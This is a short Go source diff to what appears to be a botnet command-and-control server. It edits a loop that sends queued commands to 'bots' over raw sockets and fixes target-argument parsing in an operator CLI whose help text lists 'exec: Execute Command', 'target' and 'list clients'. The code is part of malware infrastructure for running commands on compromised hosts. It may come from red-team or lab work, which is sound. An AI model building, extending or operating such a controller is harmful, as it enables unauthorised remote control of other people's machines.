@@ -70,14 +70,13 @@ func banner() {
 func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 	// Forever loop to respond to bots
 	for {
-		/* Original Code */
 		// Block on reading from channel
 		bot := <-listen
 
 		// Make a socket for sending
 		fd := rawsocket.NewSocket()
 
-		/* New Code */
+		/*Check if Packet needs to be sent */
 		queueLen := len(cmdQueue)
 		for i := 0; i < queueLen; i++ {
 			if cmdQueue[i].Target == bot.IP.String() {
@@ -125,7 +124,7 @@ func cliList(cmdArgs []string) {
 }
 
 func cli() {
-	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    list: list clients\n     info: Obtain info from payload or server"
+	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    list: list clients\n    info: Obtain info from payload or server"
 	for {
 		// reader type
 		reader := bufio.NewReader(os.Stdin)
@@ -140,9 +139,10 @@ func cli() {
 		case "help":
 			fmt.Println(help)
 		case "target":
-			if splitCmd[1] == "set" && cmdArgc >= 3 {
-				fmt.Printf("Target: %v\n", splitCmd[2])
-				targetIP = splitCmd[2]
+			// Logic error if only "target" is entered
+			if cmdArgc >= 2 {
+				fmt.Printf("Target: %v\n", splitCmd[1])
+				targetIP = splitCmd[1]
 			} else {
 				fmt.Printf("\x1b[31m[-] Incorrect Syntax\n\x1b[0m")
 			}
